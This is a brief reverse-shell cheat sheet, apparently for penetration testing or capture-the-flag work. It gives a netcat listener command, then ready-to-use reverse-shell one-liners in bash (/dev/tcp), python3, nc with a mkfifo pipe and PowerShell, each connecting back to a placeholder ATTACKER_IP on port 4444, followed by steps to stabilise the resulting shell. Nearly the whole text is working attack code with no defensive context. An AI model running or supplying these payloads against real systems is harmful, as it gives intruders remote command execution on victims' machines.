# Reverse shells

Listener on the attacker box:

```bash
rlwrap nc -lvnp 4444
```

## Payloads

```bash
# bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# python3
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'

# nc without -e
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f

# powershell (one line, url-encode when needed)
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([Text.Encoding]::ASCII).GetBytes($r),0,$r.Length)}"
```

## Stabilise a Linux shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl-Z, then on the attacker:
stty raw -echo; fg
# press Enter twice
```
